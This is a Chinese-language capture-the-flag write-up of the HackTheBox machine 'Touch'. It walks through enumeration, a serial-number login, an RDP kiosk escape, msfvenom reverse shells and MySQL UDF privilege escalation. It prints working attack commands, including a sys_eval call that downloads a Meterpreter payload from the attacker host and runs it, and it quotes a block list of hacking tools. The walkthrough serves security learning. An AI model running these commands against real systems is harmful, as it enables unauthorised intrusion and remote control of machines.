---
title: HackTheBox-Touch
published: 2026-10-15T10:30:00
description: 靶机开放 135、3389、5985、8443 端口，8443 为 Nexion DeviceHub 管理页，利用序列号登录。通过 RDP 接入受限自助终端，触发程序报错调出文件浏览器拿到低权 shell。发现本地 MySQL，使用 UDF 注入创建函数执行命令，上传 payload 获取管理员 Meterpreter 会话，拿下 root flag。
tags:
  - HackTheBox
  - 靶场
category: 网络安全
draft: false
---

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-cors: GET POST PUT OPTIONS
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

- 135 — MSRPC
- 3389 — RDP（终端服务）
- 5985 — WinRM（横幅显示为通用的 HTTPAPI 服务，但这是常见的 WinRM 端口）
- 8443 — 一个 Web 应用程序：Nexion DeviceHub 登录页面

访问8443端口是一个登录页面，进行子目录扫描：

```
// 第一次扫描发现基本都是302
ffuf -u http://10.129.61.137:8443/FUZZ -w /usr/share/wordlists/dirb/common.txt \
-o ffuf_fireflow.html -of html

// 过滤一下302
ffuf -u http://10.129.61.137:8443/FUZZ -w /usr/share/wordlists/dirb/common.txt \
-fc 302 \
-o ffuf_touch.html -of html
```

此时结果返回有一个403的路径：`api`，但是需要身份验证，再次深度扫描：

```
ffuf -u http://10.129.61.137:8443/api/FUZZ -w /usr/share/wordlists/dirb/common.txt \
-fc 302 \
-o ffuf_touch_api.html -of html
```

扫描结果发现，一个是当前设备数据：`/api/status`，另外一个则需要POST方式：`/api/scan`

status访问内容如下：

```
{
	"device":"Nexion DeviceHub DH-100",
	"serial":"NX-DH-2024-B7042",
	"firmware":"1.4.2",
	"status":"online",
	"uptime":36020
}
```

根据目前信息，使用设备标识符作为密钥是典型的“序列号即密码”错误，直接使用序列号进行登录即可

进入后就是控制台，两个设备，同样的账号密码，由于 Nmap 已经显示 WinRM (5985) 和 RDP (3389) 端口正在监听，因此下一步很自然地要查看泄露的`KioskUser`凭据是否在这两个端口上被重用

## WinRM 检查

和3389端口的rdp一样，`Winrm`也是Windows Server 2003 R2以上版本中一种方便远程管理的服务，`Winrm`基于Web服务管理（WS-Management）标准，使用HTTP协议，使用80端口或者443端口，所以请求能够更容易的穿过防火墙，当然这样也给攻击者提供了方便，当然因为系统的不同，`Winrm`的默认开放情况也不同，当然只要你端口探测到对方主机开放了`5985`或`5986`端口，那么很大概率该主机开放了`Winrm`服务。

```
nxc winrm 10.129.61.137 -u KioskUser -p 'K…………'
```

本地帐户没有使用 WinRM 的权限

## RDP 检查

```
nxc rdp 10.129.61.137 -u KioskUser -p 'K…………'
```

TLS/NLA 协商问题，回显：`SSL_NOT_ALLOWED_BY_SERVER`

## 通过 xfreerdp3 成功登录 RDP

```
xfreerdp3 /v:10.129.61.137 /u:KioskUser /p:'K…………' /cert:ignore /dynamic-resolution +clipboard
```

这使得我们能够连接到图形化的 Windows 会话`KioskUser`，证明泄露的凭据是有效的，并且之前 WinRM 的拒绝是由于 WinRM 特有的限制，而不是密码错误

RDP会话将我们带入了一个限制非常严格的自助服务终端应用程序，该程序提供两条路径：

- **自助入住**
- **员工登录**

这两个流程都无法按正常方式完成，这直接指向了一个经典的自助服务终端突破思路：故意让自助服务终端应用程序抛出未处理的错误，因为错误处理程序通常会暴露一个嵌入式浏览器（Edge/IE）或文件对话框，而这些对话框可以变成一个真正的桌面外壳

关键的观察结果是：通过 8443 端口上的 DeviceHub 门户，我们可以关闭护照扫描仪和登机牌打印机的电源，如果自助服务终端依赖这些设备在线完成扫描，那么将它们离线应该会导致扫描步骤失败并报错

## 步骤

1. 从 DeviceHub 控制面板 (8443) 关闭护照扫描仪和登机牌打印机的电源。
2. 在自助服务终端上，选择“员工登录”→“扫描徽章”**。由于扫描器目前处于离线状态，这将弹出一个应用程序错误对话框，其中包含一个可点击的链接/详细信息。
3. 点击对话框中的链接——这将打开 Microsoft Edge 浏览器。
4. 在 Edge 浏览器中，按**Ctrl+O**即可调出原生的“打开文件”对话框——这是一个常见的自助服务终端逃生技巧，因为文件选择器实际上是一个完整的资源管理器窗口。
5. 浏览到`C:\Windows\System32\`，找到`cmd.exe`并打开它。
6. 由于受限 shell 处理该操作的方式，它会先下载`cmd.exe`并运行该操作，从而在自助服务终端会话中提供一个可用的命令提示符。

成功进入Windows系统后，在desktop就发现了user.txt也就是第一个flag

## msfvenom 生成 exe 反弹

cmd的会出问题，这里替换为了ps

```
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.17.118 LPORT=4444 -f exe -o rev_ps.exe
```

开启监听，在靶机下载之后，因为白名单的限制

Kiosk 展厅锁定模式，管理员配置规则：

>  允许启动：`msedge.exe`  
>  阻止启动：powershell.exe、cmd.exe、rev.exe、nc.exe、mimikatz.exe 等所有其他名称可执行文件

所以需要重命名，而且在右键属性看到security栏，还需要解锁该exe才能运行

拿到 KioskUser 反向 shell 后，查看一下当前存在哪些用户：

```
PS C:\Users\KioskUser\Downloads> Get-ChildItem C:\Users -Force -Directory | Select FullName
FullName              
--------              
C:\Users\Administrator
C:\Users\All Users    
C:\Users\Default      
C:\Users\Default User 
C:\Users\KioskUser    
C:\Users\Public       
```

再查看一下目前运行哪些服务：

```
PS C:\Users\KioskUser\Downloads> Get-Process | Select Name
Name                 
----                 
………… 
mysql
node       
rdpclip              
…………
```

没找到rdp软件的路径，但是看到了一个`HTB Airways`的文件夹

```
PS C:\Program Files\Nexion Systems\DocReader\publish> Get-ChildItem "C:\ProgramData\HTB Airways" -Force 


    Directory: C:\ProgramData\HTB Airways


Mode                 LastWriteTime         Length Name                                            
----                 -------------         ------ ----                                            
-a----          4/4/2026   2:57 PM            286 db-config.ini                                   
-a----          4/4/2026   2:52 PM          10724 db-sync-replica.ps1                             
-a----          4/4/2026   7:34 PM            117 refresh-dates.bat                               
-a----          4/4/2026  11:58 PM           2282 refresh-dates.sql  
```

```
Get-Content "C:\ProgramData\HTB Airways\refresh-dates.bat"
```

```
.\mysql.exe -u root -h 127.0.0.1 -p
```

Touch 的核心目标：**MySQL UDF 提权**

确认 UDF 环境：

```
SHOW VARIABLES LIKE 'plugin_dir';
SHOW VARIABLES LIKE 'secure_file_priv';
```

1. `plugin_dir` 就是插件目录，预期是 `C:\MySQL\plugins\`，KioskUser 对这个目录有写入权限
2. `secure_file_priv` 限制文件读写位置，如果值为空或者包含插件目录，UDF 导入可行

取出 UDF dll 并且解码

这里使用metasploit自带的，msf 的这个 dll 无需解码

```
cp /usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll ./
```

攻击机启动服务，使用靶机下载，并且放到mysql/lib/plugin中

MySQL 内执行 UDF 创建函数

```
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys_64.dll';
```

验证身份：

```
SELECT sys_eval('whoami');
```

获取稳定 Meterpreter 会话，读取 flag

Kali 生成 payload

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.17.118 LPORT=443 -f exe -o sys_shell.exe
```

MSF 监听

```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 10.10.17.118; set LPORT 443; run"
```

MySQL 下载并执行 sys_shell.exe

```
SELECT sys_eval('cmd /c powershell -Command "Invoke-WebRequest http://10.10.17.118:8000/sys_shell.exe -OutFile C:\Windows\Temp\sys_shell.exe"');
```

```
SELECT sys_eval('cmd /c C:\Windows\Temp\sys_shell.exe');
```

拿到 meterpreter 后直接读取：

```
cat C:\Users\Administrator\Desktop\root.txt
```